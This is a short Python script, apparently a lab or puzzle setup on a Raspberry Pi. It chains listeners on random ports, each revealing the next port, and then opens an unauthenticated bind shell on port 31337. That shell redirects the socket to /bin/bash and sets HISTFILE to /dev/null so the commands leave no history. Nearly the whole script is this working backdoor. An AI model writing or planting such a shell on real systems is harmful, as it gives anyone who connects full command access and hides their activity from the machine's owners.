#!/usr/bin/python3
from random import randint
import socket 
import subprocess
import pty
import os
#s = socket.socket()

#port = 12345

#s.bind(('', port))

#s.listen(10)
#message = "WElcome!\n"
#app = "/home/pi/bind.sh"
randport = []
for i in range(3):
	randport.append(randint(1025,2500))
print(randport)
randport.append(31337)
print(randport)
ports = [1111,2222,3333,4444,31337]

def _socket(port, message):
	#print(str(port))
	#print(str(message))
	message = str(message) + "\n"
	s = socket.socket()
	s.bind(('', port))
	s.listen(10)
	conn, addr = s.accept()
	print('Connected with ' + addr[0] + ':' + str(addr[1]))
	conn.send(message.encode('utf-8'))
	#pty.spawn("/bin/sh")
	s.close()

def _shell(lport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('', lport))
	s.listen(1)
	(rem, addr) = s.accept()
	os.dup2(rem.fileno(),0)
	os.dup2(rem.fileno(),1)
	os.dup2(rem.fileno(),2)
	os.putenv("HISTFILE",'/dev/null')
	pty.spawn("/bin/bash")
	s.close()
#for elem,next_elem in zip(ports, ports[1:]+[ports[0]]):
for elem,next_elem in zip(randport, randport[1:]):
	_socket(elem,next_elem)
#_socket(31337)
_shell(31337)
#while True:
#        conn, addr = s.accept()
#        print('Connected with ' + addr[0] + ':' + str(addr[1]))
#        conn.send(message.encode('utf-8')) #send only takes string
        #for i in range(10):
        #pid = subprocess.Popen([app]).pid
        #s.send('Thanks for connecting')
#s.close()

